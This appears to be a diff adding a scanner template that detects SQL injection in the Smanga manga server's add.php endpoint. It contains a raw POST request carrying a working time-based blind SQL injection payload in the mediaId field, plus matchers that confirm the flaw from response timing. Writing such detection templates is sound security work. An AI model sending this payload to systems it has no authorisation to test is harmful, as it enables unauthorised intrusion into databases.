@@ -1,0 +1,34 @@
+id: poc-yaml-smanga-add-php-sqli
+info:
+  name: Smanga add.php SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Detects SQL injection vulnerability in the Smanga add.php endpoint.
+
+variables:
+  t1: "{{rand_int(5, 10)}}"
+  t2: "{{to_number(t1) + 1}}"
+
+http:
+  - raw:
+      - |
+        POST /php/history/add.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        chapterCover=1&chapterId=1&chapterName=1&chatpterPath=1&chaptertype=image&keyword=1&mangaCover=undefined&mangaId=1&mangaName=&mediaId=if(now()=sysdate()%2Csleep({{t1}})%2C0)&timestamp=12123123&userId=1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '"code":0,"sqlRes":true'
+        part: body
+      - type: dsl
+        dsl:
+          - duration >= to_number(t1)
+          - duration < to_number(t2)
